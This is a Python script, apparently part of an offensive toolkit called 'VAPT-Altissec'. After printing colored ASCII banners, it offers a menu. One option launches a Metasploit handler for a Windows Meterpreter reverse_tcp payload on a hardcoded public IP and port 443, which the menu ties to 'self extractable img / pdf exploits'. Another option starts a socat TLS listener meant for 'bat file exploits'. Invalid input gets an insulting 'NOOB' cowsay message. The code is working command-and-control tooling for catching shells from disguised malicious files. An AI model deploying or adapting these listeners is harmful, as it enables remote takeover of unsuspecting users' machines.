import os
import subprocess
import time

def create_gradient_colors(start_color, end_color, steps):
    """Create a list of colors transitioning from start_color to end_color."""
    colors = []
    for step in range(steps):
        r = int(start_color[0] + (end_color[0] - start_color[0]) * step / (steps - 1))
        g = int(start_color[1] + (end_color[1] - start_color[1]) * step / (steps - 1))
        b = int(start_color[2] + (end_color[2] - start_color[2]) * step / (steps - 1))
        colors.append(f"\033[38;2;{r};{g};{b}m")
    return colors

def print_fade_banner():
    # Define start and end colors (Red to Blue)
    start_color = (255, 0, 0)  # Red
    end_color = (0, 0, 255)    # Blue
    steps = 8  # Number of lines in the banner

    # Create a list of colors for the fade effect
    colors = create_gradient_colors(start_color, end_color, steps)

    banner_text = [

"██╗   ██╗ █████╗ ██████╗ ████████╗               █████╗ ██╗  ████████╗██╗███████╗███████╗ ██████╗",
"██║   ██║██╔══██╗██╔══██╗╚══██╔══╝              ██╔══██╗██║  ╚══██╔══╝██║██╔════╝██╔════╝██╔════╝",
"██║   ██║███████║██████╔╝   ██║       █████╗    ███████║██║     ██║   ██║███████╗█████╗  ██║     ",
"╚██╗ ██╔╝██╔══██║██╔═══╝    ██║       ╚════╝    ██╔══██║██║     ██║   ██║╚════██║██╔══╝  ██║     ",
" ╚████╔╝ ██║  ██║██║        ██║                 ██║  ██║███████╗██║   ██║███████║███████╗╚██████╗",
"  ╚═══╝  ╚═╝  ╚═╝╚═╝        ╚═╝                 ╚═╝  ╚═╝╚══════╝╚═╝   ╚═╝╚══════╝╚══════╝ ╚═════╝",
"                       by Aman Raj (irainsec.github.io)"

                ]

    terminal_width = os.get_terminal_size().columns
    print()  # Add space above the banner

    # Print each line of the banner with a fade effect
    for i, line in enumerate(banner_text):
        padding = (terminal_width - len(line)) // 2
        print(f"{colors[i]}{' ' * padding}{line}\033[0m")
        time.sleep(0.1)  # Optional delay for fade effect

    print()  # Add space below the banner

def print_rainbow_banner():
    rainbow_colors = [
        (255, 0, 0),    # Red
        (255, 127, 0),  # Orange
        (255, 255, 0),  # Yellow
        (0, 255, 0),    # Green
        (0, 0, 255),    # Blue
        (75, 0, 130),   # Indigo
        (148, 0, 211),  # Violet
    ]

    banner_text = [

"██╗   ██╗ █████╗ ██████╗ ████████╗               █████╗ ██╗  ████████╗██╗███████╗███████╗ ██████╗",
"██║   ██║██╔══██╗██╔══██╗╚══██╔══╝              ██╔══██╗██║  ╚══██╔══╝██║██╔════╝██╔════╝██╔════╝",
"██║   ██║███████║██████╔╝   ██║       █████╗    ███████║██║     ██║   ██║███████╗█████╗  ██║     ",
"╚██╗ ██╔╝██╔══██║██╔═══╝    ██║       ╚════╝    ██╔══██║██║     ██║   ██║╚════██║██╔══╝  ██║     ",
" ╚████╔╝ ██║  ██║██║        ██║                 ██║  ██║███████╗██║   ██║███████║███████╗╚██████╗",
"  ╚═══╝  ╚═╝  ╚═╝╚═╝        ╚═╝                 ╚═╝  ╚═╝╚══════╝╚═╝   ╚═╝╚══════╝╚══════╝ ╚═════╝",                                                                                                 
"			by Aman Raj (irainsec.github.io)"

		]

    terminal_width = os.get_terminal_size().columns
    print()  # Add space above the banner
    for i, line in enumerate(banner_text):
        r, g, b = rainbow_colors[i % len(rainbow_colors)]  # Loop colors
        padding = (terminal_width - len(line)) // 2
        print(' ' * padding + f"\033[38;2;{r};{g};{b}m{line}\033[0m")

def show_menu():
    terminal_width = os.get_terminal_size().columns
    menu_width = terminal_width - 5  # Adjust for padding

    menu_options = [ 
	" " * (terminal_width // 5 - 11) + "[1] Start Meterpreter Listener(for self extractable img / pdf exploits)",
    " " * (terminal_width // 5 - 11) + "[2] Start Socat Listener(for bat file exploits)",
	" " * (terminal_width // 5 - 11) + "[3] Exit",
    ]
    
    for option in menu_options:
        print(f"{option:<{menu_width}}")  # Fill width with options
    print()
    print("Tip: Select an option by entering the corresponding number!")
    print()

def start_meterpreter_listener():
    try:
        # Run Metasploit commands via msfconsole with the provided options
        print("Starting Meterpreter Listener:")
        subprocess.run([
            "msfconsole", 
            "-x", 
            "use exploit/multi/handler; "
            "set payload windows/meterpreter/reverse_tcp; "
            "set LHOST 194.195.114.92; "
            "set LPORT 443; "
            "exploit -j"
        ], check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error running msfconsole: {e}")
    except FileNotFoundError:
        print("msfconsole is not installed or not found in PATH. Please ensure Metasploit is installed.")

def start_Socat_listener():
    try:
        # Run Socat commands with the provided options
        print("Starting Socat Listener")
        subprocess.run([
            "socat", 
            "-d", 
            "-d", 
            "OPENSSL-LISTEN:4443,cert=bind.pem,verify=0,fork", 
            "STDOUT"
        ], check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")
    except FileNotFoundError:
        print("socat is not installed. Please install socat and try again.")

def cowsay(message1, messagespace1, message2, message3, message4, message5, message6, message7, message8, message9, message10, message11, message12, message13, message14, message15, message16, message17, messagespace2):
    # Create the cow ASCII art
    cow_art = r"""
         \   ^__^
          \  (oo)\_______
             (__)\       )\/\
                 ||----w |
                 ||     ||
    """
    
    # Create a box around the message
    messages = [message1, messagespace1, message2, message3, message4, message5, message6, message7, message8, message9, message10, message11, message12, message13, message14, message15, message16, message17, messagespace2]
    max_length = max(len(line) for line in messages)
    border = '*' * (max_length + 4)
    
    print(border)
    for line in messages:
        print(f"* {line:<{max_length}} *")
    print(border)
    
    print(cow_art)

def main():
    print_fade_banner()  # Show fade banner on startup
    # print_rainbow_banner()  # Show rainbow banner on startup
    while True:
        show_menu()  # Display the menu
        choice = input("Please select an option [1-3]: ")

        if choice == '1':
            start_meterpreter_listener()
        elif choice == '2':
            start_Socat_listener()
        elif choice == '3':
            print("Exiting...")
            break
        else:
            message1 = ("________________Are you dumb bruh? Can't you see the available option?________________")
            messagespace1 = ("")
            message2 = ("  NNNNNNNN        NNNNNNNN     OOOOOOOOO          OOOOOOOOO     BBBBBBBBBBBBBBBBB     ")
            message3 = ("  N:::::::N       N::::::N   OO:::::::::OO      OO:::::::::OO   B::::::::::::::::B    ")
            message4 = ("  N::::::::N      N::::::N OO:::::::::::::OO  OO:::::::::::::OO B::::::BBBBBB:::::B   ")
            message5 = ("  N:::::::::N     N::::::NO:::::::OOO:::::::OO:::::::OOO:::::::OBB:::::B     B:::::B  ")
            message6 = ("  N::::::::::N    N::::::NO::::::O   O::::::OO::::::O   O::::::O  B::::B     B:::::B  ")
            message7 = ("  N:::::::::::N   N::::::NO:::::O     O:::::OO:::::O     O:::::O  B::::B     B:::::B  ")
            message8 = ("  N:::::::N::::N  N::::::NO:::::O     O:::::OO:::::O     O:::::O  B::::BBBBBB:::::B   ")
            message9 = ("  N::::::N N::::N N::::::NO:::::O     O:::::OO:::::O     O:::::O  B:::::::::::::BB    ")
            message10 = ("  N::::::N  N::::N:::::::NO:::::O     O:::::OO:::::O     O:::::O  B::::BBBBBB:::::B   ")
            message11 = ("  N::::::N   N:::::::::::NO:::::O     O:::::OO:::::O     O:::::O  B::::B     B:::::B  ")
            message12 = ("  N::::::N    N::::::::::NO:::::O     O:::::OO:::::O     O:::::O  B::::B     B:::::B  ")
            message13 = ("  N::::::N     N:::::::::NO::::::O   O::::::OO::::::O   O::::::O  B::::B     B:::::B  ")
            message14 = ("  N::::::N      N::::::::NO:::::::OOO:::::::OO:::::::OOO:::::::OBB:::::BBBBBB::::::B  ")
            message15 = ("  N::::::N       N:::::::N OO:::::::::::::OO  OO:::::::::::::OO B:::::::::::::::::B   ")
            message16 = ("  N::::::N        N::::::N   OO:::::::::OO      OO:::::::::OO   B::::::::::::::::B    ")
            message17 = ("  NNNNNNNN         NNNNNNN     OOOOOOOOO          OOOOOOOOO     BBBBBBBBBBBBBBBBB     ")
            messagespace2 = ("")
            print()
            cowsay(message1, messagespace1, message2, message3, message4, message5, message6, message7, message8, message9, message10, message11, message12, message13, message14, message15, message16, message17, messagespace2)

        input("Press Enter to continue...""\n")
        print_fade_banner()

if __name__ == "__main__":
    main()
